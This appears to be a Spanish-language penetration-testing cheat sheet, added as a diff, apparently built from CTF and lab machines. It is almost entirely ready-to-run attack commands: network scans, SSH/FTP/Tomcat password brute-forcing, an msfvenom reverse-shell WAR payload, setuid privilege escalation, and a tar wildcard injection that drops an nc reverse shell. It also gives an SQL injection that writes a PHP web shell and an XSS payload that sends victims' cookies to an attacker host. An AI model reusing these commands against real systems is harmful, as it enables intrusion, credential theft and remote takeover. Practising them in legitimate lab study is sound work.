@@ -1,0 +1,238 @@
+- Recopilar info:
+
+
+nmap -p0-65535 -T5 -A 192.168.0.24
+nmap -p- -T4 -sS -O 10.0.1.3
+nmap -sSV -n -T5 IP
+nmap -p- -T5 -sS -A 192.168.3.13
+nmap -sV -v -O -A -T5 192.168.3.13 -p-
+nmap -sU -p1-1000 -n -r 192.168.3.23
+
+joomscan -u http://192.168.0.24:8081
+
+nikto -h http://IP:port -C all
+
+wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://192.168.107.135/FUZZ
+
+gobuster -u 192.168.1.103/amagicbridgeappearsatthechasm -w /root/Documents/magic_item2.txt
+
+dirb http://192.168.3.15/
+
+wpscan -u http://192.168.0.58/
+
+nc -u 192.168.3.23 666
+
+nc -l -p 4444
+
+snmp-check -t 192.168.11.5 -c death2all
+snmpwalk -v1 -c death2all 192.168.11.5
+snmpwalk -v1 -c death2allrw 192.168.11.5  | grep Locked
+snmpset -v 1 -c death2allrw 192.168.11.5 iso.3.6.1.2.1.1.6.0 s "Unlocked"
+snmpget -v 1 -c death2allrw 192.168.11.5 iso.3.6.1.2.1.1.6.0
+
+
+
+- Cracking
+
+Hacer diccionario:
+Copio todas las palabras de una web en un archivo, quito las repetidas y lo ordeno.
+
+cat file.txt | tr  ' ' '\n'
+cat file.txt | sort | uniq > pass.txt
+
+cewl -d 0 -m 4 -v "http://www.d20srd.org/indexes/magicItems.htm" -w magic_item.txt
+
+cat magic_item.txt | tr [:upper:] [:lower:] > magic_item2.txt
+
+hydra -l tomcat -P /usr/share/wordlists/rockyou.txt -e ns -s 8080 -vV 10.0.1.3 http-get /manager/html
+hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt -u -s 25 192.168.3.12 ftp
+hydra -l demonslayer -P rockyou.txt 192.168.11.5 ssh
+
+ncrack -p 22 --user demonslayer -v -P rockyou.txt -f 192.168.11.5
+
+fcrackzip -D -p ../rockyou.txt -u Whistler.zip 
+
+Script que prueba pass:
+
+#!/bin/bash
+
+passwdlist=$1
+echo "Brute forcing key..."
+while read password; do 
+    out=`curl -s -d "key=${password}" http://192.168.3.19/kzMb5nVYJw/index.php`
+    echo ${out} | grep "invalid key" >/dev/null
+    if [[ $? -ne 0 ]]; then
+        echo -e "Found key \e[32m${password}"
+        break
+    fi 
+done < ${passwdlist}
+
+./script.sh /usr/share/dict/words
+
+https://crackstation.net/
+john --wordlist=rockyou.txt --format=Raw-MD5 flag1.txt
+
+aircrack-ng -w rockyou.txt -e "community" necromancer.cap
+
+
+- Shell y payloads
+
+Payload en tomcat:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.22.4 LPORT=12345 -f war > r_jsp_shell_12345.war
+nc -nlvp 12345
+curl http://10.0.22.5:8080/r_jsp_shell_12345/
+
+
+- Postataque:
+
+Conseguir shell decente:
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+
+Encontrar archivos con setuid:
+find /bin -user root -perm -4000
+find / -perm -0002 -type f 2>/dev/null | grep -v "/proc/"
+find / -type f \( -perm /4000 -a -user root \) -ls -o \( -perm /2000 -a -group root \) -ls 2> /dev/null < root \) -ls -o \( -perm /2000 -a -group root \) -ls 2> /dev/null
+
+nmap --interactive 
+!sh
+
+sudo -l
+
+os.system('chmod u+s /bin/dash')
+
+http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt, se puede pasar un reverse shell:
+/var/www/html/>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.52.138 1337 >/tmp/f" > shell.sh
+/var/www/html/>touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+/var/www/html/>touch "/var/www/html/--checkpoint=1"
+
+
+
+- Exploiting
+
+Para actualizar la base de datos exploit.db en kali (se usa en searchsploit):
+
+mkdir tmp
+cd tmp/
+wget https://github.com/offensive-security/exploit-database/archive/master.zip
+unzip -qq master.zip
+rsync -a exploit-database-master/ /usr/share/exploitdb/
+rm -rf master.zip exploit-database-master/
+
+searchsploit ubuntu 14.04
+
+python3 -m http.server 8123
+
+gcc exploit.c -o pwn
+chown +x pwn
+./pwn
+
+
+- Ataques SQL
+
+Aprende a usuar el burp:
+
+- Poner proxy local
+- Comprobar en burp las proxy-options
+- Intercept on
+- Vas a la página principal, admites la conexión (forward) y mandas la navegación al scope.
+- En target-site map seleccionas "Spider this host"
+- Paramos spider y en proxy-options marcamos en Intercept Server Responses la opción And URL
+- Intercept off
+- Navegamos por la web, metemos una comilla simple en alguna consulta y si peta la base de datos, es que es vulnerable a sqli. 
+- A partir de ahí usar el request y utilizar sqlmap
+
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql --current-db
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql -D seattle --tables
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql -D seattle -T tblMembers --columns
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql -D seattle -T tblMembers --dumps
+sqlmap -r request.txt -p type --dbms=mysql --dump --threads=5
+sqlmap -r request.txt --sql-shell
+sqlmap -u "http://192.168.3.15/details.php?prod=1&type=1" --user-agent "TEST" --level 5 --risk 3 --dbms mysql -p prod --sql-shell
+select "<?php passthru($_GET['cmd']); ?>" into outfile '/var/www/html/test.php';
+
+
+sqlmap -r request.txt -p type --dbms=mysql --dump --threads=5 
+
+' or '1'='1
+Path traversal con burpsuite:
+Hay que buscar interceptar una conexión de download, mandarla a intruder, sustituir la variable en "positions" y en "payload" seleccionar /usr/share/wfuzz/wordlist/injections/Traversal.txt
+Si quieres recuperar alguna request o lo que se ha bajado: Request in browser-current browser session
+
+Sqli automation with burpsuite:
+Lo mismo que lo anterior, pero buscando navegar por la web para buscar queries en php, como por ejemplo details.php?prod=1&type=1. Sustituimos la variables que queramos (clear antes) y luego elegir sql.txt
+
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --risk=2 --dbms=MySQL --level=2 --dbs
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --level=5 --risk=3 --dbms=mysql --current-db
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --level=5 --risk=3 --dbms=mysql -D seth --tables
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --level=5 --risk=3 --dbms=mysql -D seth -T users --dump
+
+-Ataques PHP
+
+Creamos un phpshell sencillo en la kali:
+cd pruebas/
+cp /usr/share/webshells/php/php-reverse-shell.php knx.txt
+
+Editamos knx.txt para que el shell apunte a la ip de la kali y lo dejamos en el puerto 1234
+Abrimos un nc -lvvp 1234
+
+Arrancamos el server www en kali:
+cd pruebas/
+python3 -m http.server 80
+
+En el Repeater de burp, pulsamos go y a jugar con la shell.....
+
+
+-XSS
+
+<script>alert(123)</script>
+
+cat index.php
+<?php
+$cookie = isset($_GET["gimme"])?$_GET['gimme']:"";
+?>
+
+Ejecutar en tu kali:
+php -S IP:Port 
+php -S 192.168.11.5:80
+
+Inyectar en la web vulnerable:
+<script>location.href='http://IP/index.php?gimme='+document.cookie;</script>
+<script>location.href='http://192.168.11.5/index.php?gimme='+document.cookie;</script>
+
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dump
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --columns
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dbms=mysql -D blog --tables
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dbms=mysql -D blog -T users --columns
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dbms=mysql -D blog -T users --dump
+
+
+- Steganography
+
+strings -10 SkyDogCon_CTF.jpg
+hexdump -C SkyDogCon_CTF.jpg  | less +/"ff d9"
+convert Sky...jpg convertida.jpg
+exiftool
+binwalk -B pileoffeathers.jpg 
+foremost pileoffeathers.jpg 
+
+
+
+- Reversing
+
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
+
+objdump -x ./talisman
+
+
+
+
+
+
+
+---- Off-topic-----
+clusterssh, dsh, puppet, salt-minion, ansible
+http://superuser.com/questions/707517/how-to-send-one-command-to-multiple-pcs-over-lan-linux/707520
+http://www.unixlore.net/articles/running-remote-commands-multiple-servers-ssh-dsh.html
+---------------------
